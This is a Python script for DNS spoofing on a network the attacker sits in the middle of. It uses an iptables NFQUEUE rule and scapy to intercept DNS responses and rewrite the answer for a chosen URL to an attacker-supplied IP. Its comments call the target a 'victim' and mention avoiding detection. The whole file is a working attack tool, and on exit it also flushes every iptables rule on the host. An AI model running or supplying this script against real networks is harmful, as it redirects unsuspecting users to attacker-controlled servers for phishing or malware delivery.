#!/usr/bin python

import netfilterqueue
import scapy.all as scapy
import os
import sys

#Checks for proper input
if len(sys.argv) != 3:
    print("[!]Please supply a target URL to spoof and new desired IP")
    print("[!]Usage: dns_spoofer.py <url> <IP>")
    sys.exit()

#root check cause I hate errors
if os.getuid() != 0:
   sys.exit("[-]Please run with root permission!")


#take packet from queue and modify the DNS contents to send target to new IP
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR): ###Looks for DNSRR (DNS response)
        
        qname = scapy_packet[scapy.DNSQR].qname ### Sets the qname variable to url victim is requesting
        
        #Checks to see if url spoofing target is in any DNS packets intercepted
        if sys.argv[1] in qname:
            print("\r[!]Victim has accessed " + sys.argv[1] + " redirecting to " + sys.argv[2]),
            sys.stdout.flush()
            answer = scapy.DNSRR(rrname=qname, rdata=sys.argv[2]) ###Makes a new DNS answer with url and target IP
            
            scapy_packet[scapy.DNS].an = answer ###sets the packets an field to our supplied data
            scapy_packet[scapy.DNS].ancount = 1 ### sets the packets answer number filed to 1 to avoid detection of modified packet
            
            del scapy_packet[scapy.IP].len  ####Deletes fields that will corrupt packet so scapy can recalulate
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set_payload(str(scapy_packet)) ###Takes everything we did above and converts it back into a packer for queue
    
    packet.accept() ###forwards the modified packet!


try:
    print("[!] Setting up network queue...")
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0") 
    print("[+] Spoofing target url >>> " + sys.argv[1] + " >>> will redirect to " + sys.argv[2])
    queue = netfilterqueue.NetfilterQueue() ###creating and accessing the network queue
    queue.bind(0, process_packet)
    queue.run()

except KeyboardInterrupt:
    print("\r[!] Restoring iptables....")
    os.system("iptables --flush") ###Flush the iptables upon program exit
    print("[-] Goodbye!")

####Create net queue
    #### iptables -I FORWARD -j NFQUEUE --queue-num 0

####Reset iptables
    #### iptables --flush


####To stop traffic on our local machine
    #### iptables -I OUTPUT -j NFQUEUE --queue-num 0
    #### iptables -I INPUT -j NFQUEUE --queue-num 0
